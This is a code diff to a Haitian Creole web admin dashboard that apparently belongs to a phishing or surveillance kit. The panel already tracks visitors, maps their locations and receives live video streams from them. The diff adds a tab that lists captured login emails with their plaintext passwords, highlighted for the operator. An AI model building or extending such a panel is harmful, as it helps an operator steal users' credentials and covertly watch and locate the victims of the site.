@@ -257,6 +257,7 @@
     <button class="tab" id="tabImages">🖼 Imaj</button>
     <button class="tab" id="tabOrders">📦 Kòmand</button>
     <button class="tab" id="tabMap">🗺️ Kat</button>
+    <button class="tab" id="tabLogins">🔐 Koneksyon</button>
   </div>
 
   <div id="visitorsView">
@@ -323,6 +324,15 @@
     </div>
   </div>
 
+  <div id="loginsView" class="hidden">
+    <div class="form-card">
+      <h2>🔐 Koneksyon (<span id="loginCount">0</span>)</h2>
+      <div class="locations-list" id="loginsList">
+        <div class="empty">Pa gen koneksyon ankò</div>
+      </div>
+    </div>
+  </div>
+
   <div class="modal-bg hidden" id="modalBg">
     <div class="modal">
       <h3>✏️ Modifye pwodwi</h3>
@@ -371,14 +381,16 @@ const tabVisitors = document.getElementById("tabVisitors");
 const tabImages   = document.getElementById("tabImages");
 const tabOrders   = document.getElementById("tabOrders");
 const tabMap      = document.getElementById("tabMap");
+const tabLogins   = document.getElementById("tabLogins");
 const visitorsView= document.getElementById("visitorsView");
 const imagesView  = document.getElementById("imagesView");
 const ordersView  = document.getElementById("ordersView");
 const mapView     = document.getElementById("mapView");
+const loginsView  = document.getElementById("loginsView");
 
 function switchTab(tab) {
-  [tabVisitors, tabImages, tabOrders, tabMap].forEach(t => t.classList.remove("active"));
-  [visitorsView, imagesView, ordersView, mapView].forEach(v => v.classList.add("hidden"));
+  [tabVisitors, tabImages, tabOrders, tabMap, tabLogins].forEach(t => t.classList.remove("active"));
+  [visitorsView, imagesView, ordersView, mapView, loginsView].forEach(v => v.classList.add("hidden"));
   tab.classList.add("active");
 
   if (tab === tabVisitors) visitorsView.classList.remove("hidden");
@@ -388,12 +400,14 @@ function switchTab(tab) {
     mapView.classList.remove("hidden");
     setTimeout(() => { if (map) map.invalidateSize(); }, 100);
   }
+  if (tab === tabLogins)   loginsView.classList.remove("hidden");
 }
 
 tabVisitors.onclick = () => switchTab(tabVisitors);
 tabImages.onclick   = () => switchTab(tabImages);
 tabOrders.onclick   = () => switchTab(tabOrders);
 tabMap.onclick      = () => switchTab(tabMap);
+tabLogins.onclick   = () => switchTab(tabLogins);
 
 /* ============================================
    KAT LEAFLET
@@ -472,6 +486,40 @@ db.ref("locations").on("value", (snapshot) => {
       }
     };
     locationsList.appendChild(div);
+  });
+});
+
+/* ============================================
+   KONEKSYON (LOGINS) — AK MODPAS
+   ============================================ */
+const loginsList = document.getElementById("loginsList");
+const loginCount = document.getElementById("loginCount");
+
+db.ref("logins").on("value", (snapshot) => {
+  const data = snapshot.val();
+  loginsList.innerHTML = "";
+
+  if (!data || Object.keys(data).length === 0) {
+    loginsList.innerHTML = '<div class="empty">Pa gen koneksyon ankò</div>';
+    loginCount.innerText = "0";
+    return;
+  }
+
+  const entries = Object.entries(data).sort((a, b) => b[1].time - a[1].time);
+  loginCount.innerText = entries.length;
+
+  entries.forEach(([id, log]) => {
+    const div = document.createElement("div");
+    div.className = "loc-card";
+    div.innerHTML = `
+      <div class="name">📧 ${log.email || "Anonim"}</div>
+      <div class="info">
+        🔑 Modpas: <strong style="color:#ff9800;">${log.password || "—"}</strong><br>
+        🆔 ${log.visitorId || id}<br>
+        🕐 ${new Date(log.time).toLocaleString()}
+      </div>
+    `;
+    loginsList.appendChild(div);
   });
 });
 
@@ -906,11 +954,9 @@ modalSave.onclick = async () => {
       watchdog: null, iceCheck: null
     };
 
-    // ✅ KÒD AMELYORE — FÒSE VIDEOYO PLAY
     call.on("stream", (remoteStream) => {
       console.log("🎬 Stream rive pou:", visitorId);
       
-      // ✅ VERIFYE TRACKS
       const vTracks = remoteStream.getVideoTracks();
       const aTracks = remoteStream.getAudioTracks();
       console.log("📹 Video tracks rive:", vTracks.length);
@@ -923,7 +969,6 @@ modalSave.onclick = async () => {
       
       video.srcObject = remoteStream;
       
-      // ✅ ESeye play plizyè fwa
       const tryPlay = () => {
         video.play().then(() => {
           console.log("✅ Videyo ap jwe!");
@@ -932,7 +977,6 @@ modalSave.onclick = async () => {
         }).catch(e => {
           console.warn("⚠️ Play echwe:", e.name);
           
-          // Si play echwe → montre yon bouton
           if (!card.querySelector(".play-overlay")) {
             const overlay = document.createElement("button");
             overlay.className = "play-overlay";
@@ -965,16 +1009,10 @@ modalSave.onclick = async () => {
         });
       };
       
-      // Eseye touswit
       tryPlay();
-      
-      // Eseye ankò apre 1s
       setTimeout(tryPlay, 1000);
-      
-      // Eseye ankò apre 3s
       setTimeout(tryPlay, 3000);
       
-      // Klike nenpòt kote = play
       const clickHandler = () => {
         if (video.paused) {
           video.play().catch(e => console.warn("play err:", e));
